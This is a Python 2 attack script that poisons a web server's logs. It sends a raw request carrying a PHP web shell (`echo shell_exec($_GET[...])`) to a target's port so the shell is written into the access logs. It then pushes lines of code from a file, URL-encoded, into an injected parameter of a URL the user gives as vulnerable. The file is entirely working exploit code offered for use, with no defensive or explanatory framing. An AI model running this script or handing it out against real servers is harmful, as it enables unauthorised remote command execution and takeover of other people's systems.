import urllib
import requests
import argparse
import socket


parser = argparse.ArgumentParser()
parser.add_argument('-f', '--file', required=True, type=str, help='file with code to send')
parser.add_argument('-u', '--url', required=True, type=str, help='full vulnerable url (minus injected parameter')
parser.add_argument('-p', '--parameter', required=True, type=str, help='injected parameter (ex: cmd)')
parser.add_argument('-v', '--verbose', action='count', default=0, help='v: increased detail; vv: even more detail')
subparsers = parser.add_subparsers(help='inject -h for details')

parser_inj = subparsers.add_parser('inject')
parser_inj.add_argument('target', type=str, help='target to inject parser')
parser_inj.add_argument('--port', default=80, type=int, help='port to inject (default: 80)')
args = parser.parse_args()


def inject_php_parser(target, port, parameter, verbose):
    if target.startswith('http://'):
        tmp_target = target[7:]
    elif target.startswith('https://'):
        tmp_target = target[8:]
    else:
        tmp_target = target
    local_target = socket.gethostbyname(tmp_target)
    param_parse = "<?php echo shell_exec($_GET['{0}']);?>".format(parameter)
    print '[+] inject php parameter parser enabled'
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    if verbose > 0:
        print '[+] connecting to {0} on port {1}'.format(local_target, port)
    client.connect((local_target, port))
    if verbose > 0:
        print '[+] injecting: {0}'.format(param_parse)
    client.send(param_parse + '\x0d\x0a')
    client.close()


def poision_web_logs(infile, inurl, parameter, verbose):
    print '[+] url: {0}, parameter: {1}'.format(inurl, parameter)
    with open(infile, 'rb') as f:
        print '[+] code read from file: {0}'.format(infile)
        print '[+] sending requests...'
        status_codes = []
        for line in f.readlines():
            # eliminate whitespace & newlines
            line = line.strip()
            tmp_url = inurl.split('&')
            if verbose > 1:
                print
                print 'VERBOSE: {0}'.format(tmp_url)
            # save end parameter separate, in case of null byte inclusion
            end_url = ''
            if len(tmp_url) > 1:
                end_url = tmp_url.pop()
            if verbose > 1:
                print 'VERBOSE: {0}'.format(end_url)
            # stitch url back together with &'s
            url = '&'.join(tmp_url)
            # strip leftmost &
            url = url.lstrip('&')
            if verbose > 1:
                print 'VERBOSE: {0}'.format(url)
            # append the parameter + encoded line of code + last parameter
            url += '&{0}={1}&{2}'.format(parameter, urllib.quote_plus(line), end_url).rstrip('&')
            if verbose > 1:
                print 'VERBOSE: {0}'.format(url)

            if verbose > 0:
                print '[+] sending: {0}'.format(url)
            r = requests.get(url, headers={'user-agent': 'Mozilla'})
            status_codes.append(r.status_code)
            if verbose > 0:
                if r.status_code == 200:
                    print '[+] success!'
                else:
                    print '[!] error: {0} - {1}'.format(r.status_code, r.reason)

    if len(set(status_codes)) == 1 and 200 in set(status_codes):
        print '[+] 100% successful transfer!'
    else:
        print '[!] You encountered errors with the transfer. Response codes: {}'.format(set(status_codes))


if __name__ == '__main__':
    if args.target:
        inject_php_parser(args.target, args.port, args.parameter, args.verbose)
    poision_web_logs(args.file, args.url, args.parameter, args.verbose)
